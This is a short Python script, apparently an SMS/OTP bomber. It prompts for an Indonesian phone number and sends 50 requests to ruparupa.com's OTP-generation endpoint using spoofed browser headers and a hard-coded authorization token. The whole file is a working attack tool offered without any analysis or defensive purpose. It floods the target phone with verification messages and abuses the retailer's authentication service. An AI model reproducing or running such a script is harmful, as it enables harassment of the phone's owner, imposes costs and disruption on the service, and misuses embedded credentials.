import requests,json

nomor = input("Masukan Nomor (8xxxxx) : ")

for i in range(50):
   pos=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"120","sec-ch-ua-mobile":"?0","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs","content-type":"application/json","x-company-name":"odi","accept":"application/json","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","user-platform":"desktop","x-frontend-type":"desktop","sec-ch-ua-platform":"Linux","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"message","email":"","token":"","customer_id":"0","is_resend":0})).text
